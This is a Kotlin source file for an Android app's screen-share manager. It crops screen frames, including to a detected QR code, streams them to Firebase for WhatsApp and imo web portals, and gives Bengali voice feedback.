package com.example.util

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.widget.Toast
import com.example.data.firebase.FirebaseScreenStreamManager
import com.example.data.model.PathChannel
import com.example.data.model.PathChannelsRegistry
import com.example.data.model.WebsitePlatform
import com.example.service.ScreenShareService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * ScreenShareManager
 *
 * Lightweight, zero-overhead screen sharing manager:
 * - Smart QR Code cropping via Google ML Kit Barcode Scanning (`QR_CODE_ONLY`) + Full/Half/Zoom modes
 * - Direct conflated Firebase Realtime Database streaming (no local socket server or disk I/O overhead)
 * - Instant unified website mode switching (`WhatsApp` <-> `imo` on a single link)
 */
object ScreenShareManager {

    private const val TAG = "ScreenShareManager"

    enum class ScreenCropMode(val labelBn: String, val descriptionBn: String) {
        QR_CODE_ONLY("স্মার্ট QR স্ক্যানার (ML Kit)", "Google ML Kit দিয়ে নিখুঁতভাবে কিউআর কোড ক্রপ করে লাইভ শেয়ার"),
        FULL("ফুল স্ক্রিন", "সম্পূর্ণ ডিসপ্লে শেয়ার"),
        TOP_HALF("উপরের অর্ধেক", "স্ক্রিনের উপরের ৫০% ক্রপ"),
        BOTTOM_HALF("নিচের অর্ধেক", "স্ক্রিনের নিচের ৫০% ক্রপ"),
        CENTER_ZOOM("সেন্টার জুম", "মাঝের অংশ বড় ও জুম করা")
    }

    private val _isSharing = MutableStateFlow(false)
    val isSharing: StateFlow<Boolean> = _isSharing.asStateFlow()

    private val _durationSeconds = MutableStateFlow(0)
    val durationSeconds: StateFlow<Int> = _durationSeconds.asStateFlow()

    private val _latestFrameBitmap = MutableStateFlow<Bitmap?>(null)
    val latestFrameBitmap: StateFlow<Bitmap?> = _latestFrameBitmap.asStateFlow()

    private val _cropMode = MutableStateFlow(ScreenCropMode.QR_CODE_ONLY)
    val cropMode: StateFlow<ScreenCropMode> = _cropMode.asStateFlow()

    private val _zoomScale = MutableStateFlow(1.0f)
    val zoomScale: StateFlow<Float> = _zoomScale.asStateFlow()

    private val _selectedPlatform = MutableStateFlow(WebsitePlatform.WHATSAPP)
    val selectedPlatform: StateFlow<WebsitePlatform> = _selectedPlatform.asStateFlow()

    private val _isWhatsAppSiteActive = MutableStateFlow(false)
    val isWhatsAppSiteActive: StateFlow<Boolean> = _isWhatsAppSiteActive.asStateFlow()

    private val _isImoSiteActive = MutableStateFlow(false)
    val isImoSiteActive: StateFlow<Boolean> = _isImoSiteActive.asStateFlow()

    val firebaseCloudUrl: String
        get() = firebaseStreamManager?.directRestUrl ?: "https://my-sc-tools-default-rtdb.firebaseio.com/screen_share/live.json"

    val firebaseRtdbPath: String
        get() = firebaseStreamManager?.currentLivePath ?: "screen_share/live"

    private var firebaseStreamManager: FirebaseScreenStreamManager? = null
    private var durationJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.Main)

    fun getCurrentChannel(): PathChannel {
        return firebaseStreamManager?.currentChannel?.value
            ?: PathChannelsRegistry.CHANNELS.first()
    }

    fun ensureInitialized(context: Context): FirebaseScreenStreamManager {
        val existing = firebaseStreamManager
        if (existing != null) return existing

        val app = context.applicationContext
        val mgr = FirebaseScreenStreamManager.getInstance(app)
        firebaseStreamManager = mgr
        _selectedPlatform.value = mgr.selectedPlatform.value
        scope.launch {
            mgr.selectedPlatform.collect { _selectedPlatform.value = it }
        }
        scope.launch {
            mgr.isWhatsAppSiteActive.collect { _isWhatsAppSiteActive.value = it }
        }
        scope.launch {
            mgr.isImoSiteActive.collect { _isImoSiteActive.value = it }
        }
        return mgr
    }

    fun selectWebsitePlatform(platform: WebsitePlatform, context: Context? = null, announce: Boolean = true) {
        _selectedPlatform.value = platform
        context?.let { ctx ->
            ensureInitialized(ctx)
            AppPreferences.getInstance(ctx).selectedWebsitePlatform = platform
        }
        firebaseStreamManager?.selectPlatform(platform)
        syncPlatformStatesFromFirebase()
        if (announce && context != null) {
            VibrationHelper(context).tap()
            TtsManager(context).speak("একই লিংকে ${platform.labelBn} সক্রিয় হয়েছে।")
        }
    }

    private fun syncPlatformStatesFromFirebase() {
        firebaseStreamManager?.let { mgr ->
            _selectedPlatform.value = mgr.selectedPlatform.value
            _isWhatsAppSiteActive.value = mgr.isWhatsAppSiteActive.value
            _isImoSiteActive.value = mgr.isImoSiteActive.value
        }
    }

    fun loginChannelByPassword(input: String, context: Context): Boolean {
        val mgr = ensureInitialized(context)
        val channel = AppPreferences.getInstance(context).loginChannelByPassword(input)
        return if (channel != null) {
            mgr.switchChannel(channel)
            syncPlatformStatesFromFirebase()
            ChannelWebPortalGenerator.syncChannelPortalOnLogin(context, channel)
            VibrationHelper(context).success()
            TtsManager(context).speak("আলহামদুলিল্লাহ! আপনি ${channel.nameBn} চ্যানেলে লগইন করেছেন।")
            true
        } else {
            VibrationHelper(context).tap()
            TtsManager(context).speak("পাসওয়ার্ড সঠিক নয়। অনুগ্রহ করে আবার চেষ্টা করুন।")
            false
        }
    }

    fun onShareStarted(context: Context) {
        _isSharing.value = true
        _durationSeconds.value = 0
        val mgr = ensureInitialized(context)
        val channel = getCurrentChannel()
        ChannelWebPortalGenerator.ensurePortalSynced(context, channel)
        val platform = _selectedPlatform.value
        mgr.startStreaming(platform)
        syncPlatformStatesFromFirebase()
        startDurationTimer()
        VibrationHelper(context).success()
        TtsManager(context).speak("আলহামদুলিল্লাহ! ${platform.labelBn} এ লাইভ স্ক্রিন শেয়ারিং শুরু হয়েছে।")
    }

    fun onShareStopped(context: Context) {
        _isSharing.value = false
        _latestFrameBitmap.value = null
        stopDurationTimer()
        val mgr = ensureInitialized(context)
        mgr.stopAllStreaming()
        syncPlatformStatesFromFirebase()
        QrCodeDetector.reset()
        VibrationHelper(context).tap()
        TtsManager(context).speak("স্ক্রিন শেয়ারিং বন্ধ করা হয়েছে এবং ফায়ারবেজ থেকে ডাটা ক্লিন করা হয়েছে।")
    }

    fun applyCrop(source: Bitmap): Bitmap {
        try {
            val w = source.width
            val h = source.height
            if (w <= 10 || h <= 10) return source

            when (_cropMode.value) {
                ScreenCropMode.QR_CODE_ONLY -> {
                    val targetRect = QrCodeDetector.getEffectiveQrRect(w, h)
                    val side = targetRect.width
                    return Bitmap.createBitmap(source, targetRect.left, targetRect.top, side, side)
                }

                ScreenCropMode.FULL -> {
                    val scale = _zoomScale.value
                    if (scale <= 1.05f) return source

                    val cropW = (w / scale).toInt().coerceIn(40, w)
                    val cropH = (h / scale).toInt().coerceIn(40, h)
                    val startX = ((w - cropW) / 2).coerceIn(0, w - cropW)
                    val startY = ((h - cropH) / 2).coerceIn(0, h - cropH)
                    return Bitmap.createBitmap(source, startX, startY, cropW, cropH)
                }

                ScreenCropMode.TOP_HALF -> {
                    val cropH = (h * 0.52f).toInt().coerceIn(40, h)
                    return Bitmap.createBitmap(source, 0, 0, w, cropH)
                }

                ScreenCropMode.BOTTOM_HALF -> {
                    val startY = (h * 0.48f).toInt().coerceIn(0, h - 40)
                    val cropH = (h - startY).coerceIn(40, h)
                    return Bitmap.createBitmap(source, 0, startY, w, cropH)
                }

                ScreenCropMode.CENTER_ZOOM -> {
                    val cropW = (w * 0.58f).toInt().coerceIn(40, w)
                    val cropH = (h * 0.58f).toInt().coerceIn(40, h)
                    val startX = ((w - cropW) / 2).coerceIn(0, w - cropW)
                    val startY = ((h - cropH) / 2).coerceIn(0, h - cropH)
                    return Bitmap.createBitmap(source, startX, startY, cropW, cropH)
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error applying crop to frame: ${e.message}")
            return source
        }
    }

    fun setCropMode(mode: ScreenCropMode, context: Context? = null) {
        _cropMode.value = mode
        if (mode != ScreenCropMode.FULL) {
            _zoomScale.value = 1.0f
        }
        context?.let { ctx ->
            VibrationHelper(ctx).tap()
            TtsManager(ctx).speak("${mode.labelBn} নির্বাচিত হয়েছে।")
        }
    }

    fun setZoomScale(scale: Float, context: Context? = null) {
        val clamped = scale.coerceIn(1.0f, 2.5f)
        _zoomScale.value = clamped
        if (_cropMode.value != ScreenCropMode.FULL) {
            _cropMode.value = ScreenCropMode.FULL
        }
        context?.let { ctx ->
            VibrationHelper(ctx).tap()
        }
    }

    fun increaseZoom(context: Context? = null) {
        setZoomScale((_zoomScale.value + 0.25f).coerceAtMost(2.5f), context)
    }

    fun decreaseZoom(context: Context? = null) {
        setZoomScale((_zoomScale.value - 0.25f).coerceAtLeast(1.0f), context)
    }

    fun resetCrop(context: Context? = null) {
        _cropMode.value = ScreenCropMode.FULL
        _zoomScale.value = 1.0f
        context?.let { ctx ->
            VibrationHelper(ctx).tap()
        }
    }

    @Volatile
    private var lastUiPreviewUpdateMs = 0L

    fun isCurrentModePreCropped(): Boolean {
        return _cropMode.value != ScreenCropMode.FULL || _zoomScale.value > 1.05f
    }

    fun updateLatestFrame(bitmap: Bitmap, jpegBytes: ByteArray) {
        val now = System.currentTimeMillis()
        if (_latestFrameBitmap.value == null || now - lastUiPreviewUpdateMs >= 120L) {
            lastUiPreviewUpdateMs = now
            _latestFrameBitmap.value = bitmap
        }
        firebaseStreamManager?.onNewScreenFrame(
            jpegBytes = jpegBytes,
            durationStr = formatDuration(_durationSeconds.value),
            isPreCropped = isCurrentModePreCropped()
        )
    }

    fun startScreenShare(context: Context, resultCode: Int, data: Intent) {
        ensureInitialized(context)
        if (_cropMode.value != ScreenCropMode.QR_CODE_ONLY && _cropMode.value != ScreenCropMode.FULL) {
            _cropMode.value = ScreenCropMode.QR_CODE_ONLY
        }
        val intent = Intent(context, ScreenShareService::class.java).apply {
            action = ScreenShareService.ACTION_START_SCREEN_SHARE
            putExtra(ScreenShareService.EXTRA_RESULT_CODE, resultCode)
            putExtra(ScreenShareService.EXTRA_RESULT_DATA, data)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    }

    fun stopScreenShare(context: Context) {
        val mgr = ensureInitialized(context)
        val stoppedPlatform = _selectedPlatform.value
        val otherStillActive = mgr.stopStreamingPlatform(stoppedPlatform)
        syncPlatformStatesFromFirebase()
        if (!otherStillActive) {
            val intent = Intent(context, ScreenShareService::class.java).apply {
                action = ScreenShareService.ACTION_STOP_SCREEN_SHARE
            }
            context.startService(intent)
            _isSharing.value = false
            _latestFrameBitmap.value = null
            stopDurationTimer()
            QrCodeDetector.reset()
            VibrationHelper(context).tap()
            TtsManager(context).speak("${stoppedPlatform.labelBn} এর স্ক্রিন শেয়ার বন্ধ করা হয়েছে।")
        }
    }

    fun stopAllScreenShare(context: Context) {
        val intent = Intent(context, ScreenShareService::class.java).apply {
            action = ScreenShareService.ACTION_STOP_SCREEN_SHARE
        }
        context.startService(intent)
        onShareStopped(context)
    }

    fun clearFirebaseCloudData(context: Context, showFeedback: Boolean = true) {
        val mgr = ensureInitialized(context)
        val target = _selectedPlatform.value
        mgr.clearFirebaseData(allPlatforms = false) {
            syncPlatformStatesFromFirebase()
            if (!_isWhatsAppSiteActive.value && !_isImoSiteActive.value) {
                _latestFrameBitmap.value = null
            }
            if (showFeedback) {
                VibrationHelper(context).success()
                Toast.makeText(context, "${target.labelBn} স্ক্রিন ডাটা ক্লেয়ার হয়েছে!", Toast.LENGTH_SHORT).show()
                TtsManager(context).speak("আলহামদুলিল্লাহ! ${target.labelBn} থেকে স্ক্রিন শেয়ার ডাটা ক্লেয়ার করা হয়েছে।")
            }
        }
    }

    private fun startDurationTimer() {
        stopDurationTimer()
        durationJob = scope.launch {
            while (isActive) {
                delay(1000L)
                _durationSeconds.value += 1
            }
        }
    }

    private fun stopDurationTimer() {
        durationJob?.cancel()
        durationJob = null
    }

    fun formatDuration(totalSeconds: Int): String {
        val minutes = totalSeconds / 60
        val seconds = totalSeconds % 60
        return String.format("%02d:%02d", minutes, seconds)
    }
}
